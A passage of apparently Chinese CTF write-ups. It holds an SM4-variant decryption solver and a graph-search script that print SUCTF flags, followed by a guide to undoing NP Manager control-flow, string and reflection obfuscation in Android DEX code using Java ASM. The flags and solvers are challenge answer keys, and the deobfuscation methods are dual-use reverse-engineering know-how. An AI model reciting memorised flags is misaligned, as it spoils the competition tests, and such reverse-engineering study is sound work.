encryption/decryption contents. * args:    [in] x0: original contents; * args:    [in] x1: original contents; * args:    [in] x2: original contents; * args:    [in] x3: original contents; * args:    [in] rk: encryption/decryption key; * return the contents of encryption/decryption contents. */static uint32 sm4F(uint32 x0, uint32 x1, uint32 x2, uint32 x3, uint32 rk){    return (x0 ^ sm4Lt(x1 ^ x2 ^ x3 ^ rk));}/* private function: * Calculating round encryption key. * args:    [in] a: a is a 32 bits unsigned value; * return: sk[i]: i{0,1,2,3,...31}. */static uint32 sm4CalciRK(uint32 ka){    uint32 bb = 0;    uint32 rk = 0;    uint8 a[4];    uint8 b[4];    PUT_UINT32_BE(ka, a, 0)    b[0] = sm4Sbox(a[0]);    b[1] = sm4Sbox(a[1]);    b[2] = sm4Sbox(a[2]);    b[3] = sm4Sbox(a[3]);    GET_UINT32_BE(bb, b, 0)    rk = bb ^ (ROTL(bb, 13)) ^ (ROTL(bb, 23));    return rk;}static void sm4_setkey(uint32 SK[32], uint8 key[16]){    uint32 MK[4];    uint32 k[36];    uint32 i = 0;    GET_UINT32_BE(MK[0], key, 0);    GET_UINT32_BE(MK[1], key, 4);    GET_UINT32_BE(MK[2], key, 8);    GET_UINT32_BE(MK[3], key, 12);    k[0] = MK[0] ^ FK[0];    k[1] = MK[1] ^ FK[1];    k[2] = MK[2] ^ FK[2];    k[3] = MK[3] ^ FK[3];    for (; i &lt; 32; i++)    {        k[i + 4] = k[i] ^ (sm4CalciRK(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ CK[i]));        SK[i] = k[i + 4];    }}/* * SM4 standard one round processing * */static void sm4_one_round(uint32 sk[32],                          uint8 input[16],                          uint8 output[16]){    uint32 i = 0;    uint32 ulbuf[36];    memset(ulbuf, 0, sizeof(ulbuf));    GET_UINT32_LE(ulbuf[0], input, 0)    GET_UINT32_LE(ulbuf[1], input, 4)    GET_UINT32_LE(ulbuf[2], input, 8)    GET_UINT32_LE(ulbuf[3], input, 12)    while (i &lt; 32)    {        ulbuf[i + 4] = ulbuf[i] ^ sm4Lt(ulbuf[i + 1] ^ ulbuf[i + 2] ^ ulbuf[i + 3] ^ sk[i]) ^ 0xdeadbeef;        i++;    }    PUT_UINT32_LE(ulbuf[35], output, 0);    PUT_UINT32_LE(ulbuf[34], output, 4);    PUT_UINT32_LE(ulbuf[33], output, 8);    PUT_UINT32_LE(ulbuf[32], output, 12);}/* * SM4 key schedule (128-bit, encryption) */void sm4_setkey_enc(sm4_context *ctx, uint8 key[16]){    ctx-&gt;mode = SM4_ENCRYPT;    sm4_setkey(ctx-&gt;sk, key);}/* * SM4 key schedule (128-bit, decryption) */void sm4_setkey_dec(sm4_context *ctx, uint8 key[16]){    int i;    ctx-&gt;mode = SM4_ENCRYPT;    sm4_setkey(ctx-&gt;sk, key);    for (i = 0; i &lt; 16; i++)    {        SWAP(ctx-&gt;sk[i], ctx-&gt;sk[31 - i]);    }}/* * SM4-ECB block encryption/decryption */void sm4_crypt_ecb(sm4_context *ctx,                   int mode,                   int length,                   uint8 *input,                   uint8 *output){    while (length &gt; 0)    {        sm4_one_round(ctx-&gt;sk, input, output);        input += 16;        output += 16;        length -= 16;    }}/* * SM4-CBC buffer encryption/decryption */void sm4_crypt_cbc(sm4_context *ctx,                   int mode,                   int length,                   uint8 iv[16],                   uint8 *input,                   uint8 *output){    int i;    uint8 temp[16];    if (mode == SM4_ENCRYPT)    {        while (length &gt; 0)        {            for (i = 0; i &lt; 16; i++)                output[i] = (uint8)(input[i] ^ iv[i]);            sm4_one_round(ctx-&gt;sk, output, output);            memcpy(iv, output, 16);            input += 16;            output += 16;            length -= 16;        }    }    else /* SM4_DECRYPT */    {        while (length &gt; 0)        {            memcpy(temp, input, 16);            sm4_one_round(ctx-&gt;sk, input, output);            for (i = 0; i &lt; 16; i++)                output[i] = (uint8)(output[i] ^ iv[i]);            memcpy(iv, temp, 16);            input += 16;            output += 16;            length -= 16;        }    }}void printHex(char *name, void *ptr, int len){    printf(\"%s\", name);    for (size_t i = 0; i &lt; len; i++)        printf(\"%02x\", ((uint8 *)ptr)[i]);    printf(\"\\n\");}void printHex_withSpace(char *name, void *ptr, int len){    printf(\"%s\\n\", name);    for (size_t i = 0; i &lt; len * 4; i++)        printf(\"%02x \", ((uint8 *)ptr)[i]);    printf(\"\\n\");}void hexdump(char *name, const void *data, size_t size) {    const unsigned char *byte_data = (const unsigned char *)data;    size_t i, j;    printf(\"%s\\n\", name);    for (i = 0; i &lt; size; i += 16) {        // 打印偏移地址        printf(\"%08zx  \", i);        // 打印十六进制数据        for (j = 0; j &lt; 16; ++j) {            if (i + j &lt; size) {                printf(\"%02x \", byte_data[i + j]);            } else {                printf(\"   \"); // 不足部分用空格填充            }            // 在每8字节后添加一个额外的空格            if (j == 7) {                printf(\" \");            }        }        printf(\" |\");        // 打印ASCII字符        for (j = 0; j &lt; 16; ++j) {            if (i + j &lt; size) {                unsigned char ch = byte_data[i + j];                printf(\"%c\", isprint(ch) ? ch : '.');            } else {                printf(\" \");            }        }        printf(\"|\\n\");    }}uint32 wtfRotate(uint32 a) {    return BYTEn(a, 3) &lt;&lt; 24 | BYTEn(a, 0) &lt;&lt; 16 | BYTEn(a, 1) &lt;&lt; 8 | BYTEn(a, 2);}int main(){    unsigned int RK[32] = {            0xD82A4100, 0x086FDB9C, 0x54729EE3, 0x642D1011, 0x9730EF5F, 0xB85C0651, 0xBA8D1C0D, 0x0849E21D,            0xC94DFAB0, 0x25EFA522, 0x5AC0EB10, 0x4BCFEBA7, 0x41905F52, 0x5C7CC60E, 0x278DD7C6, 0x9A350413,            0xD70ABA28, 0xBC153002, 0xC1E22407, 0xD856CD4D, 0xD155AF6F, 0xECBC0A53, 0xF41DAB0D, 0x6332E744,            0x58B84CEB, 0xBBEC0444, 0x79393283, 0x2509498E, 0x5CE96C70, 0xD5058E68, 0xACF4C9A3, 0x08A8E93E    };    // reverse RK    for (int i = 0; i &lt; 16; ++i) {        uint32 tmp = RK[31 - i];        RK[31 - i] = RK[i];        RK[i] = tmp;    }    unsigned int encryptedData[8] = {            0x50BCA8F0, 0xCEF73AD9, 0x77EA2849, 0xB017B433, 0xADA5B98E, 0x2FDE72D2, 0x4CF27246, 0x3834416D    };    unsigned int round2[8] = {};    memcpy(round2, encryptedData, 32);    for (int i = 0; i &lt; 8; ++i) {        encryptedData[i] =  wtfRotate(encryptedData[i]);    }    uint32 output[8] = {};    sm4_context ctx;    memcpy(ctx.sk, RK, 32 * 4);    ctx.mode = SM4_DECRYPT;    printHex(\"Input: \", encryptedData, 32);    sm4_crypt_ecb(&amp;ctx, SM4_DECRYPT, 32, (uint8 *) encryptedData, (uint8 *) output);    printHex(\"Output: \", output, 32);    for (int i = 0; i &lt; 8; ++i) {        output[i] =  wtfRotate(output[i]);    }    auto *p1 = (uint64 *) (output + 4);    auto *p2 = (uint64 *) round2;    for (int i = 0; i &lt; 2; ++i) {        *p1++ ^= *p2++;    }    auto *ptr = (uint64 *) output;    // iv    *ptr ^= 0x6e696874656d6f73;    *(ptr + 1) ^= 0x646f6f67746f6e67;    auto *dt = (uint8 *) output;    for (int i = 0; i &lt; 32; ++i) {        printf(\"%c\", dt[i]);    }    return 0;}// Input: bca8f050f73ad9ceea28497717b433b0a5b98eadde72d22ff272464c34416d38// Output: 085d11015a5d440d58585012585e5354dfccc961c20aefadd94b714321d70589// b2ed053c767f41709dc1605c8c346c69// SUCTF{b2ed053c767f41709dc1605c8c346c69}\n\nSU_mapmap2 (赛后)ida 反编译大函数很慢。。。赛后发现 BN 可以反\n这是一题搜索题\n就是这个函数很大，结果 BN 秒出\n\n反编译成 IL 是最容易写脚本的\n\n简单分析一下就是一开始生成一个 (树图)，因为我不知道怎么描述这个，姑且叫他树图\n\n类似于这样一个结构，然后输入的每一位字符拆成高四位和第四位作为map的下标去取，从 rax_2 对应的那个 map 开始一直取到 rax_800，路径就是 flag\nimport recodes = open(\"source.c\", \"r\").read().split(\"\\n\")parms = {}selected = Nonefor code in codes:    if code.startswith(\"void*\"):        # 初始化 map        name = re.findall(\" (.*) =\", code)[0].strip()        parms[name] = dict()    elif code.startswith(\"var\"):        # 变量赋值        name = re.findall(\"(.*) =\", code)[0].strip()        value = int(re.findall(\"= (.*);\", code)[0].strip(), 16)        parms[name] = value    elif code.startswith(\"int64_t*\"):        # 获取子字典        name = re.findall(\"int64_t\\\\* (.*) =\", code)[0].strip()        args = re.findall(r\"map_index\\((.*), &amp;(.*)\\);\", code)[0]        target = parms[args[1]]        if target not in parms[args[0]]:            parms[args[0]][target] = dict()        parms[name] = parms[args[0]][target]    elif code.startswith(\"*unordered_map_index\"):        # 赋值        args = re.findall(r\"unordered_map_index\\((.*), &amp;(.*)\\) = (.*);\", code)[0]        target = parms[args[1]]        parms[args[0]][target] = args[2]walked = {}def search(cur, paths):    if cur == \"rax_800\":        print(len(paths), paths)        return True    target = parms[cur]    for k1 in target.keys():        for k2 in target[k1].keys():            goto = target[k1][k2]            if not walked.get(goto, False):                val = k1 &lt;&lt; 4 | k2                v0 = val - 97                if v0 &gt; 0x16 or v0 &lt; 0:                    continue                new_path = paths + chr(val)                # print(goto, new_path)                walked[goto] = True                result = search(goto, new_path)                walked[goto] = Falsewalked[\"rax_2\"] = Truesearch(\"rax_2\", \"\")# ddssaassddddssddssssaassaawwwwwwaassssssssssddssssssddwwddddssssddssssddwwwwddssddwwddssddwwwwwwwwwwaawwaawwddwwaaaawwwwddwwddssddddddssaassaassddssddwwddwwwwwwwwwwwwddssssssssssddddssssssddwwwwwwddssddssaassssddssssaaaawwwwaassssaawwaassssssddddssssddssssssaassdddddd# SUCTF{8b587367b99e5e2fcbdb6598da14b9bc}\n\n其中 source.c 就是从 bn 里拉下来的 反编译后的 IL\n下载地址：https://s3.carbo.ink/img/2025/01/6903cc2dc509469c01bfa2f6938c9526.c\n","tags":["Reverse"]},{"title":"NP管理器DEX加固解混淆","url":"/2024/10/06/np_obfuscation/","content":"通过一道SCTF的安卓题记一次反混淆\n静态调用混淆 动态调用混淆 引用混淆 字符串混淆 数字混淆 控制流混淆\n\n\n最近在打 sctf 的时候，遇到了一题安卓题，用的 NP 管理器的控制流混淆，用了 switch 来打乱程序的执行流，还有一些比较麻烦的混淆，如果一步步调试的话可能工作量比较大，于是想到了利用 ASM 框架和混淆特征，来实现一个 NP混淆的反混淆器\nDex 转 Jar虽然 Dex 可以转成 smali 后修改再编译回去，但是笔者没有找到像 OW2 ASM 那样成熟的字节码编辑框架，所以最后选择了 先用 d2j-dex2jar 转换成 jar 后在用 ASM 去反混淆\n我选择了 Github 上一个比较成熟的 Java 反混淆器，虽然没有为 NP定制的 Transformer，但是好在写自定义的 Transformer 比较方便https://github.com/java-deobfuscator/deobfuscator\n然后使用 d2j-dex2jar 把 dex 转换成 jar，开始编写反混淆器\n反混淆部分控制流混淆\n这个会在每个 case 结束前对 var0 进行赋值，来让人难以推断下一个 case是什么，而且一般还与数字混淆配合在一起比如 这种静态变量 组合运算还有调用静态函数获取值还有先把下一个 case 的值计算完之后存在局部变量里，然后跳转前再读取出来的这里的 var7_23 读取了上面运算出来的值控制流混淆笔者没有什么好的办法，而且提前算出来的一些数字似乎会有一些 case 是不可达的，但是分析后发现函数要实现功能这些块应该是肯定会执行的不到的目前的方法是对 switch 建立一个 label 索引表，然后把对 var7_23 赋值的内容根据索引表找出下一跳的 Label，然后把 goto 的内容修改为索引表中的 Label，最后去掉 switch，让反编译器去优化控制流\n数字混淆上面分析控制流混淆的时候已经分析过了三种数字混淆，初次之外还有这种在嵌套在其他表达式中的数字混淆对于数组混淆笔者的解决办法是利用 VM 去执行，这样可以最大程度上避免精度造成的问题\nInteger num1 = getTargetInteger((FieldInsnNode) start);  Integer num2 = getTargetInteger((FieldInsnNode) getNextN(start, 1));  MethodNode calcMethod = new MethodNode(Opcodes.ACC_PUBLIC | Opcodes.ACC_STATIC, \"carbo_calc\", \"()Ljava/lang/Integer;\", null, null);  calcMethod.visitCode();  calcMethod.visitLdcInsn(num1);  calcMethod.visitLdcInsn(num2);  calcMethod.visitInsn(getNextN(start, 2).getOpcode());  calcMethod.visitLdcInsn(Utils.getIntValue(getNextN(start, 3)));  calcMethod.visitInsn(getNextN(start, 4).getOpcode());  calcMethod.visitInsn(IRETURN);  mathClz.methods.add(calcMethod);  Integer result = vm.execute(mathClz, calcMethod).getReturnValue().asInt();  mathClz.methods.clear();\n\nFakeJump 不可达跳转混淆还有一些这种静态变量组成的计算式 组成的条件跳转，其中参杂着一些假的跳转举个例子，分别找到这两个静态变量的值，然后得到算式-909 | 639 * 5237 = -901计算出来后的值 -901 不满足跳转条件，这里就是一个不可达的区块，很容易干扰阅读\n变量引用混淆NP为了隐藏调用的变量，在 np.protect 下生成了几个类根据传入的参数通过反射获取变量或者调用方法\n\n这里还有一些 byte[] 组成的字符串，我们先写一个方法来把这里数字还原成字符串先来分析这种 byte[] 形式字符串的字节码特征，我们使用 Recaf 反编译\nnew java/lang/String // 初始化一个 String Objectdup bipush 6 // 往栈顶压入数字 6newarray byte // 一个 TypeInsnNode，申明数组dup iconst_0 // 数组下标 0bipush 73 // 数组第一个元素的的值i2b // 把栈顶的 73 转换为 byte 类型，等同于 (byte)73bastore // 等于是存入数组dup iconst_1 bipush 108i2b bastore dup iconst_2 bipush 79i2b bastore dup iconst_3 bipush 84i2b bastore dup iconst_4 bipush 68i2b bastore dup iconst_5 bipush 121i2b bastore invokespecial java/lang/String.&lt;init&gt; ([B)V // 调用 new String(xxx)astore v1 // 保存到 v1 变量里goto B\n\n然后就可以写一个方法根据特征还原 String 类\npublic boolean fixNPByteString(AbstractInsnNode start, MethodNode methodNode, boolean checkFlag) throws UnsupportedEncodingException {            AbstractInsnNode check = start;          if (!(check instanceof TypeInsnNode &amp;&amp; check.getOpcode() == NEW &amp;&amp; ((TypeInsnNode) check).desc.equals(\"java/lang/String\"))) return false;          check = getNextN(start, 1);          if (!(check instanceof InsnNode &amp;&amp; check.getOpcode() == DUP)) return false;          check = getNextN(start, 2);          if (!(check instanceof IntInsnNode &amp;&amp; check.getOpcode() == BIPUSH) &amp;&amp; !(check instanceof InsnNode &amp;&amp; check.getOpcode() &gt;= ICONST_0 &amp;&amp; check.getOpcode() &lt;= ICONST_5)) return false;          if (checkFlag) return true;          int length = -1;          if (check instanceof IntInsnNode) length = ((IntInsnNode) check).operand;          else length = check.getOpcode() - ICONST_0;          check = start;          toRemove = new ArrayList&lt;&gt;();          toRemove.addAll(Arrays.asList(                  check,                  getNextN(check, 1),                  getNextN(check, 2),                  getNextN(check, 3)          ));          check = getNextN(start, 4);          byte[] bytes = new byte[length];          for (int i = 0; i &lt; length; i++) {              toRemove.addAll(Arrays.asList(                      check,                      getNextN(check, 1),                      getNextN(check, 2),                      getNextN(check, 3),                      getNextN(check, 4)              ));              int bit = -1;              if (getNextN(check, 2) instanceof IntInsnNode) {                  bit = ((IntInsnNode) getNextN(check, 2)).operand;              } else {                  bit = check.getOpcode() - ICONST_0;              }              bytes[i] = (byte) bit;              check = getNextN(check, 5);          }          String s = new String(bytes, \"UTF-8\");  //        System.out.println(String.format(\"Got a string.. %s\", s));          if (!(check instanceof MethodInsnNode &amp;&amp; ((MethodInsnNode) check).owner.equals(\"java/lang/String\")                  &amp;&amp; ((MethodInsnNode) check).name.equals(\"&lt;init&gt;\"))) return false;          toRemove.add(check);          methodNode.instructions.insertBefore(check, new LdcInsnNode(s));          toRemove.forEach(insn -&gt; {methodNode.instructions.remove(insn);});          return true;      }\n\n效果\n可以根据每个 case 的字符串个数判断这是 一个 String 对象还是一个 变量引用然后就可以写一个方法把它们转换回 FieldInsnNode \npublic Map&lt;Integer, FieldResult&gt; getFieldMap(Map&lt;LabelNode, Integer&gt; iLmap, MethodNode methodNode) {      boolean foundSwitch = false;      Map&lt;Integer, FieldResult&gt; result = new HashMap&lt;&gt;();      for (AbstractInsnNode insn : methodNode.instructions) {          if (insn instanceof LookupSwitchInsnNode) foundSwitch = true;          if (!foundSwitch) continue;          if (insn instanceof LabelNode) {              LabelNode thisLabel = (LabelNode) insn;              if (iLmap.containsKey(thisLabel)) {                  // 开始往下寻找                  ArrayList&lt;String&gt; ldcList = new ArrayList&lt;&gt;();                  AbstractInsnNode ptr = insn.getNext();                  while (ptr != null &amp;&amp; !(ptr instanceof LabelNode)) {                      if (ptr instanceof LdcInsnNode) ldcList.add((String) ((LdcInsnNode) ptr).cst);                      ptr = ptr.getNext();                  }                  if (!ldcList.isEmpty()) {                      if (ldcList.size() == 1) {                          // 字符串对象                          result.put(iLmap.get(thisLabel), new FieldResult(ldcList.get(0)));                          System.out.printf(\"Found new field %s\\n\", ldcList.get(0));                      } else {                          String desc = ldcList.get(2);                          StringBuilder param = new StringBuilder();                          if (desc.startsWith(\"[\")) desc = desc;                          else if (typeMap.containsKey(desc)) desc = typeMap.get(desc);                          else {                              desc = String.format(\"L%s;\", desc.replace(\".\", \"/\"));                          }                          FieldInsnNode fieldInsnNode = new FieldInsnNode(                                  GETSTATIC,                                  ldcList.get(0).replace(\".\", \"/\"),                                  ldcList.get(1),                                  desc                          );                          System.out.printf(\"Found new field: %s %s %s\\n\", ldcList.get(0), ldcList.get(1), desc);                          result.put(iLmap.get(thisLabel), new FieldResult(fieldInsnNode));                      }                  }              }          }      }      return result;  }\n\npublic boolean patchNPField(AbstractInsnNode start, MethodNode methodNode, ClassNode classNode, boolean checkFlag) {      if (!isNPFieldCall(start)) return false;      AbstractInsnNode check = start;      MethodInsnNode method = (MethodInsnNode) check;      check = check.getPrevious();        if (!Utils.isInteger(check)) return false;      if (checkFlag) return true;        int val = Utils.getIntValue(check);        if (NPFieldMap.containsKey(val)) {          FieldResult fieldResult = NPFieldMap.get(val);          List&lt;AbstractInsnNode&gt; toRemove = Arrays.asList(                  start.getPrevious()          );            if (fieldResult.type.equals(\"str\")) {              methodNode.instructions.set(start, new LdcInsnNode(fieldResult.strObj));              System.out.printf(\"Fixed a string field %s\\n\", fieldResult.strObj);          } else {              FieldInsnNode fieldInsnNode = new FieldInsnNode(GETSTATIC, fieldResult.fieldInsnNode.owner, fieldResult.fieldInsnNode.name, fieldResult.fieldInsnNode.desc);              methodNode.instructions.set(start, fieldInsnNode);              System.out.printf(\"Fixed a field %s %s %s\\n\", fieldResult.fieldInsnNode.owner, fieldResult.fieldInsnNode.name, fieldResult.fieldInsnNode.desc);          }            toRemove.forEach(insn -&gt; methodNode.instructions.remove(insn));      } else {          System.out.printf(\"%d not in the field map...\\n\", val);      }        return true;    }\n\n效果\n\n方法调用混淆和上面的方法引用一样，先吧数字值和对应的方法调用对应起来\n然后与方法混淆不同的是，原本函数调用的参数被魔改成了一个 Object 数组传递过去，想要还原得先吧 Object 数组解析出来，然后恢复原本的函数调用\n\nldc 72724 // 第一个参数 72724aconst_null  // 第二个参数 nulliconst_1 // Object 数组长度anewarray java/lang/Object // 申明新建数组dup iconst_0 // 元素下标getstatic kotlinx/coroutines/channels/ۨ۠ۤ۟.۟۠ۨۧۢ I // FieldInsnNode 获取那个sipush -26811 // 对应上面那个被异或的值ixor // 异或invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer; // 转换成 int 类型aastore // 数组保存invokestatic np/protect/\\u06E5ۣۢۢ.n (ILjava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object; // 调用这个方法checkcast java/lang/Booleaninvokevirtual java/lang/Boolean.booleanValue ()Zistore i23ldc 72724aconst_null iconst_1 anewarray java/lang/Objectdup iconst_0 getstatic kotlinx/coroutines/channels/ۨ۠ۤ۟.۟۠ۨۧۢ Isipush -26811ixor invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;aastore invokestatic np/protect/\\u06E5ۣۢۢ.n (ILjava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;checkcast java/lang/Booleaninvokevirtual java/lang/Boolean.booleanValue ()Zistore i24\n\n和上面的变量引用混淆一样，建立一个对应表后可以根据传递的第一个参数来还原这张图可以很明显的看出删减的内容还原前还原后\n总结反混淆结果\npackage com.example.bbandroid;import androidx.cardview.widget.ۤۦ۠ۧ;import androidx.constraintlayout.core.motion.parse.۟ۥۡۦ۟;import androidx.constraintlayout.core.widgets.analyzer.۟ۡۧ۠ۢ;import androidx.core.view.autofill.۟ۢۦۧۥ;import androidx.legacy.coreutils.۟ۥۤۦۤ;import androidx.lifecycle.viewmodel.۟ۦۡ۟ۥ;import androidx.localbroadcastmanager.ۥۣۡ۠;import androidx.startup.ۣ۟ۧ۠ۧ;import androidx.vectordrawable.۟ۡ۠ۤۨ;import androidx.versionedparcelable.۟ۧۤ۟ۧ;import com.google.android.material.appbar.ۣ۟ۧ۠;import com.google.android.material.datepicker.ۦۣۧۥ;import com.google.android.material.imageview.ۣ۟۟ۨۥ;import com.google.android.material.theme.ۢۧ۟ۢ;import com.google.android.material.transition.platform.۟۠۟ۧۡ;import java.util.Arrays;import kotlin.comparisons.۟ۦۤ۠ۢ;import kotlin.enums.۟ۥۧۡ۠;import kotlin.internal.jdk8.ۦۤۤۡ;import kotlinx.coroutines.android.ۥۣ۠۟;import kotlinx.coroutines.sync.ۦۨۦۤ;public class strange {   private static final char[] ALPHABET;   private static final int[] LOOKUP;   private static final short[] short;   static {      int var0 = 1754379;      char[] var3 = null;      int[] var4 = null;      int var1 = 0;      int var2 = 0;      while (true) {         switch (var0) {            case 56419:               throw new ArithmeticException(\"divide by zero\");            case 56544:               var3 = ALPHABET;               var0 = 1747810;               continue;            case 1747810:               if (var2 &lt; var3.length) {                  ۟ۡۧ۠ۢ.ۣ۟ۧۧ۟();                  var0 = 1754375;                  continue;               }            case 1752551:               ۢۧ۟ۢ.ۣ۟ۥۢۤ();               String var9 = \"ۣۤ\";               var0 = 56447;               continue;            case 1748613:               var0 = 1755336;               continue;            case 1748796:               LOOKUP[61] = 0;               var0 = 1753508;               continue;            case 1749574:               LOOKUP[var3[var2]] = var2;               var0 = 1749729;               continue;            case 1749729:               var1 = var2 + 1;               ۦۤۤۡ.ۨۥۢ۟ = 7;               var0 = 1749729;               continue;            case 1750562:            case 1750625:               var0 = 56544;               continue;            case 1750813:               var4 = new int[256];               String var8 = \"ۧۨۧ\";               break;            case 1751554:               var0 = 1754379;               continue;            case 1751648:               ALPHABET = ۦۣۧۥ.ۣۣۡ۟(short, 0, 64, 3052).toCharArray();               ۟ۥۡۦ۟.ۣ۟ۡ۟۠();               var0 = 1754379;               continue;            case 1752648:               var0 = 1751554;               continue;            case 1753508:               if (oOo0.isPortInUse(27042)) {                  var0 = 56419;                  continue;               }            case 1751775:               var0 = 1755624;               continue;            case 1754375:               Arrays.fill(var4, -1);               String var7 = \"ۣۡ۟\";               var0 = 1748613;               continue;            case 1754379:               short = new short[]{                  2946,                  2947,                  2972,                  2973,                  2974,                  2975,                  2968,                  2984,                  2985,                  2986,                  2987,                  2980,                  2981,                  2982,                  2983,                  2976,                  2948,                  2949,                  2950,                  2951,                  2944,                  3001,                  3002,                  3005,                  3006,                  3007,                  3000,                  3011,                  3003,                  2996,                  2997,                  2998,                  2957,                  2958,                  2989,                  2990,                  2991,                  2959,                  2952,                  2953,                  2954,                  2955,                  2945,                  2969,                  2970,                  3034,                  3035,                  3028,                  3029,                  3015,                  2971,                  2964,                  2965,                  2966,                  3036,                  3037,                  3038,                  3039,                  3032,                  3033,                  2977,                  2978,                  2979,                  3004               };               var0 = 1751648;               continue;            case 1754662:               LOOKUP = var4;               ۣ۟۟ۨۥ.ۤۢۡ = 22;               String var6 = \"ۣۡ۟\";               break;            case 1755336:               var0 = 56544;               var2 = 0;               continue;            case 1755560:               String var5 = \"ۥۥۨ\";               var0 = 1750562;               var2 = var1;               continue;            case 1755624:               return;            default:               continue;         }         var0 = 1755560;      }   }   public strange() {      int var1 = 56474;      Integer var2 = null;      while (true) {         switch (var1) {            case 56474:               if (۟ۦۡ۟ۥ.۟ۥۥۥۧ() &lt;= 0) {                  ۤۦ۠ۧ.۠ۦۨ();                  var1 = 56474;                  break;               }            case 1754440:               String var4 = \"ۥۣۨ\";               var1 = 1751618;               break;            case 1746751:               System.out.println(var2);               String var3 = \"ۥۣۨ\";               var1 = 1752736;               break;            case 1748859:               var2 = Integer.valueOf(۟ۢۦۧۥ.ۣۣ۟۟ۧ(\"LV4FmlkaVyEOjznZ4\"));               var1 = 1746784 + (۟۠۟ۧۡ.۟ۦۣۡۨ | ۦۨۦۤ.ۥۣۣ۟);               break;            case 1750817:               var1 = 56474;               break;            case 1752736:               return;         }      }   }   public static String encode(byte[] var0) {      boolean var24 = false;      int var18 = 0;      int var20 = 0;      int var19 = 0;      int var11 = 0;      int var10 = 0;      int var16 = 0;      int var17 = 0;      int var14 = 0;      int var13 = 0;      char[] var26 = null;      byte var2 = 0;      char var5 = 0;      byte var6 = 0;      char var4 = 0;      char var3 = 0;      char var1 = 0;      int var9 = 0;      int var8 = 0;      int var21 = 0;      int var15 = 0;      int var12 = 0;      int var7 = 1748833;      StringBuilder var28 = null;      boolean var23 = false;      while (true) {         label246:         while (true) {            label244:            while (true) {               label242:               while (true) {                  label238:                  while (true) {                     label223:                     while (true) {                        label219:                        while (true) {                           label213:                           while (true) {                              label203:                              while (true) {                                 label197:                                 while (true) {                                    label191:                                    while (true) {                                       switch (var7) {                                          case 56356:                                             var7 = 56474;                                             continue;                                          case 56390:                                             var7 = 2 + var9;                                             if (var7 &lt; var0.length) {                                                byte var42 = var0[var7];                                                var7 = 255 &amp; var42;                                                String var69 = \"ۢۨۢ\";                                                break label246;                                             }                                          case 1751682:                                             ۥۣۡ۠.۟ۥۣ۠ۤ();                                             String var68 = \"ۥ۟ۨ\";                                             var7 = 1752490;                                             continue;                                          case 56543:                                             var17 = var10 + 1;                                             var7 = 1751655;                                             var14 = var11;                                             continue;                                          case 56570:                                             var7 = 1747931;                                             continue;                                          case 1746752:                                             break label197;                                          case 1747714:                                             throw new ArithmeticException(\"divide by zero\");                                          case 1747808:                                             StringBuilder var66 = var28.append(var1);                                             var7 = var9 + 3;                                             String var67 = \"ۦۢۥ\";                                             break label238;                                          case 1747874:                                          case 1747931:                                             ۥۣ۠۟.ۣۦ۠ۥ = 11;                                             String var65 = \"ۦۣۨ\";                                             var7 = var8;                                             break label219;                                          case 1747927:                                             String var64 = \"ۦۧ۠\";                                             int var49 = 1750597;                                             var14 = var14;                                             var7 = 1750597;                                             continue;                                          case 1747928:                                             var7 = var0.length;                                             var21 = var7;                                             int var48 = 1753416;                                             var12 = 0;                                             var15 = var7;                                             var7 = var48;                                             continue;                                          case 1748645:                                          case 1754570:                                             String var63 = \"ۢۨ\";                                             var7 = var9;                                             break label238;                                          case 1748799:                                             var7 = 1748645;                                             continue;                                          case 1748833:                                             var23 = new MainActivity().initSth();                                             var24 = oOo0.isPortInUse(27042);                                             var7 = 1750815;                                             var23 = var24;                                             var24 = var23;                                             continue;                                          case 1749603:                                             var3 = var26[63 &amp; var14];                                             var7 = 1751588;                                             continue;                                          case 1749672:                                             var7 = 1755465;                                             var4 = (char)var6;                                             continue;                                          case 1749852:                                             var7 = var11 &amp; var16 | var11 ^ var16;                                             int var47 = 1747927;                                             var13 = var10;                                             var14 = var7;                                             var7 = var47;                                             continue;                                          case 1749853:                                          case 1753663:                                             ۣ۟ۧ۠ۧ.ۨۦۣ۠ = 67;                                             var7 = 1746971;                                             continue;                                          case 1750568:                                             var12++;                                             var7 = 56356;                                             continue;                                          case 1750597:                                             break label203;                                          case 1750662:                                             var7 = 1748833;                                             continue;                                          case 1750815:                                             if (var23) {                                                var7 = 1747714;                                                continue;                                             }                                          case 1753607:                                             String var61 = \"ۥۣۢ\";                                             var7 = var9;                                             break label238;                                          case 1751493:                                             var2 = 61;                                             if (var13 &lt; 2) {                                                var5 = var26[var14 &gt;&gt; (۟ۥۧۡ۠.۟ۢۧۢۧ ^ 74) &amp; 63];                                                var2 = 61;                                                int var46 = 1754629;                                                var11 = var11;                                                var7 = var46;                                                continue;                                             }                                             break label203;                                          case 1751530:                                             ۟ۦۤ۠ۢ.ۣ۟ۡۧ۠();                                             var7 = 56543;                                             var10 = var19;                                             continue;                                          case 1751561:                                             var19 = var8 + 1;                                             var7 = 1751530;                                             var11 = var18;                                             continue;                                          case 1751563:                                             var7 = 1753452;                                             var12 = 0;                                             continue;                                          case 1751588:                                             ۟ۧۤ۟ۧ.ۣ۟۟ۧۧ();                                             var7 = 1751561;                                             var1 = var3;                                             continue;                                          case 1751653:                                             if (var9 &lt; var0.length) {                                                var7 = (var0[var9] &amp; 255) &lt;&lt; 16;                                                var7 &amp;= -16777216 ^ var7;                                                int var45 = 1752639;                                                var18 = var7;                                                var7 = var45;                                                continue;                                             }                                             break label213;                                          case 1751655:                                             ۟ۥۤۦۤ.۟ۢۨ۟ۨ = 8;                                             var7 = 1747874;                                             var13 = var17;                                             continue;                                          case 1752489:                                             return var28.toString();                                          case 1752490:                                             var26 = ALPHABET;                                             StringBuilder var59 = var28.append(var26[var14 &gt;&gt; 18 &amp; 63]);                                             var59 = var28.append(var26[var14 &gt;&gt; 12 &amp; 63]);                                             var7 = var20;                                             break label242;                                          case 1752580:                                             var28 = new StringBuilder();                                             var7 = 1755468;                                             continue;                                          case 1752616:                                             String var58 = \"ۧۨۧ\";                                             var7 = var16;                                             break label246;                                          case 1752639:                                             var7 = 1 + var9;                                             if (var7 &gt;= var0.length) {                                                break label244;                                             }                                             var7 = (var0[var7] &amp; (۟ۡ۠ۤۨ.ۥۥۡۤ ^ 108)) &lt;&lt; 8;                                             break label242;                                          case 1752709:                                             var7 = 1749672;                                             var6 = 61;                                             continue;                                          case 1753416:                                             if (!var24) {                                                var7 = var21 + 1;                                                String var57 = \"ۤۡۨ\";                                                break label223;                                             }                                     